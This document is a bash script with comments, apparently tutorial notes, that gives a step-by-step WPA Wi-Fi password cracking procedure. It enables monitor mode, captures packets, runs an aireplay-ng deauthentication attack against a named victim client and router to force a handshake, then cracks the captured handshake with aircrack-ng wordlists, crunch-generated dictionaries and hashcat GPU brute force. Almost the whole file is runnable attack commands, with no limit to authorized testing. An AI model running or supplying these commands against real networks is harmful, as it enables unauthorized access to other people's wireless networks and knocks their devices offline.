#!/bin/bash

#-------------------------------------------------------------

# METHOD: Use aircrack-ng to crack the password 
# Dictionary attack: using a wordlist 
# (standard ones like `rockyou` or ones generated from tools like 
# `crunch`, `CeWL` - a web crawler, or `Cupp`)
# or directly Brute Force using hashcat, if you have a GPU

# ALTERNATE 1: using `hashcrack` and tools from 
# the `hcxtools` library: `hcxdumptool`, `hcxpioff`, `hxpcapngtool`

# ALTERNATE 2: using the tool `wifite` - a script in python 
# that has automated attacks to crack wifi passwords.

#-------------------------------------------------------------

# Video link:
## https://www.youtube.com/watch?v=ekQcXCeXAII

#-------------------------------------------------------------

# NECESSARY TOOLS: iwconfig, aircrack-ng, wireshark, hashcrack, wget, unzip, crunch

#-------------------------------------------------------------

sudo $package_manager install iw net-tools aircrack-ng wireshark hashcrack crunch wget unzip # optionally install cewl and cupp

# to show the network configuration and find out the NIC / Adapter
iwconfig
# for more info on the interface
ifconfig $interface
iwconfig $interface

# updated commands iw and ip
ip link
ip link $interface
iw $interface info

# to start the monitor mode for the interface
sudo airmon-ng start $interface 

# in case of the error
sudo airmon-ng check kill
# to start the monitor mode for the interface
sudo airmon-ng start $interface 

# to dump the captured packets from interface
# this checks all channels - channel hopping
sudo airodump-ng $interface
# here you have to parse through the output to find out 
# the router MAC, channel of the device and a few other things

# to find out the devices on that channel and locate the victim device and a few other things
sudo airodump-ng --bssid $router --channel $channel

# to capture all the packets and write to a file
sudo airodump-ng --channel $channel --write $filename --bssid $router $interface

# to start the actual deauth attack
# number: n for n deauth packets and 0 for indefinite deauth
# if -c is not specified, all clients will be deauthed
# -a = access point MAC
# -c = destination MAC
sudo aireplay-ng --deauth $number -c $victim -a $router $interface 

# to stop monitor mode on the NIC after deauth attack
sudo airmon-ng stop $interface

# to change the interface to managed mode
sudo ifconfig $interface down
sudo iwconfig $interface mode Managed
sudo ifconfig $interface up  

# to restart all the services stopped by `airmon-ng check kill`
sudo service $service1 start
sudo service $service2 start
sudo service $service3 start

# Optional:
# use wireshark to analyze the WPA handshake
ls -la | grep -Ei ".cap"
wireshark ./$capture.cap
# or `ls | grep -Ei ".cap" | wireshark`
# use the filter "eapol" - Extensible Authentication Protocol over LAN
# message 1 to 4 - 4 way handshake

#-------------------------------------------------------------

# Launch bruteforce or dictionary attack on captured WPA 4 way handshake

# to create a custom dictionary, use the crunch tool.
# min and max give the lengths
# charset is the set of characters to use
# c_pattern is a crunch-specific style of pattern for the password, in case a password is partially known
crunch $min $max $char_set -o $wordlist -t $c_pattern

# /usr/share/dict/words - a default dictionary in Kali
# From aircrack man page, a list of wordlists: https://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
# suggested - rockyou
sudo aircrack-ng $capture.cap -w $wordlists

#-------------------------------------------------------------

# have to convert .cap to .hccapx - file format conversion: cap2hccapx.bin
# sudo /usr/share/hashcat-utils/cap2hccapx.bin $capture $hashcatfile # on Kali Linux
wget https://github.com/hashcat/hashcat-utils/archive/master.zip
# extract and use:
unzip master.zip
cd hashcat-utils-master/src
make
./cap2hccapx.bin ../$capture.cap ../$hashcatfile.hccapx

# to see the GPUs and info - Hashcat used for a bruteforce using a GPU
hashcat -I

# use -a 3 for --attack-mode=bruteforce, -m for --hash-type=WPA and $pattern for (regex-like) pattern to use
hashcat -m 2500 -a 3 $hashcatfile.hccapx $pattern
# press `s` key to keep checking the status of the cracking

